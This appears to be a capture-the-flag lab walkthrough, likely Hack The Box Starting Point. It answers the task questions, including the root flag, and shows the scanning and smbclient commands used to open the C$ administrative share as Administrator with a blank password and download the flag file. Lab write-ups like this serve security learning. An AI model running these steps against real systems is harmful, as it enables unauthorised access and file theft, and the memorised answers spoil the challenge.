# Tasks
- Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?
	- -Pn
- What does the 3-letter acronym SMB stand for?
	- Server Message Block
- What port does SMB use to operate at?
	- 445
- What command line argument do you give to `smbclient` to list available shares?
	- -L
- What character at the end of a share name indicates it's an administrative share?
	- $
- Which Administrative share is accessible on the box that allows users to view the whole file system?
	- C$
- What command can we use to download the files we find on the SMB Share?
	- get
- Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?
	- psexec.py
- Submit root flag
	- f751c19eda8f61ce81827e6930a1f40c


# Steps
- First, let's do a rustscan
```
rustscan --ulimit 5000 --addresses "10.129.221.198" --top -- -sC -sV
```
- We get this results that we have SMB running on this machine
```
PORT    STATE SERVICE       REASON          VERSION  
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn  
445/tcp open  microsoft-ds? syn-ack ttl 127  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: -1s  
| p2p-conficker:    
|   Checking for Conficker.C or higher...  
|   Check 1 (port 21084/tcp): CLEAN (Timeout)  
|   Check 2 (port 44775/tcp): CLEAN (Timeout)  
|   Check 3 (port 25706/udp): CLEAN (Timeout)  
|   Check 4 (port 46955/udp): CLEAN (Timeout)  
|_  0/4 checks are positive: Host is CLEAN or ports are blocked  
| smb2-time:    
|   date: 2025-11-23T23:25:39  
|_  start_date: N/A  
| smb2-security-mode:    
|   311:    
|_    Message signing enabled but not required
```
- We can now use smbclient to list out the available shares we have
```
smbclient -L 10.129.221.198 -U Administrator
```
- We are able to skip the password and get the results
```
Password for [WORKGROUP\Administrator]:  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       C$              Disk      Default share  
       IPC$            IPC       Remote IPC  
SMB1 disabled -- no workgroup available
```
- Looks like the C drive share is unprotected, so let's connect to there
```
smbclient \\\\10.129.221.198\\C$ -U Administrator
```
- We are now able to navigate the machine
```
Password for [WORKGROUP\Administrator]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 $Recycle.Bin                      DHS        0  Wed Apr 21 08:23:49 2021  
 Config.Msi                        DHS        0  Wed Jul  7 11:04:56 2021  
 Documents and Settings          DHSrn        0  Wed Apr 21 08:17:12 2021  
 pagefile.sys                      AHS 738197504  Sun Nov 23 15:19:44 2025  
 PerfLogs                            D        0  Sat Sep 15 00:19:00 2018  
 Program Files                      DR        0  Wed Jul  7 11:04:24 2021  
 Program Files (x86)                 D        0  Wed Jul  7 11:03:38 2021  
 ProgramData                        DH        0  Tue Sep 13 09:27:53 2022  
 Recovery                         DHSn        0  Wed Apr 21 08:17:15 2021  
 System Volume Information         DHS        0  Wed Apr 21 08:34:04 2021  
 Users                              DR        0  Wed Apr 21 08:23:18 2021  
 Windows                             D        0  Wed Jul  7 11:05:23 2021  
  
               3774463 blocks of size 4096. 1155657 blocks available  
smb: \>
```
- From there, let's navigate the Adminstrator's Desktop folder and download the flag
```
smb: \> cd Users\Administrator\Desktop\  
smb: \Users\Administrator\Desktop\> ls  
 .                                  DR        0  Thu Apr 22 00:16:03 2021  
 ..                                 DR        0  Thu Apr 22 00:16:03 2021  
 desktop.ini                       AHS      282  Wed Apr 21 08:23:32 2021  
 flag.txt                            A       32  Fri Apr 23 02:39:00 2021  
  
               3774463 blocks of size 4096. 1155385 blocks available  
smb: \Users\Administrator\Desktop\> get flag.txt  
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
smb: \Users\Administrator\Desktop\>
```
- We can now read out the flag on our machine
```
[Nov 23, 2025 - 15:29:41 (PST)] exegol-htb-starting-point /workspace # cat flag.txt           
f751c19eda8f61ce81827e6930a1f40c#
```
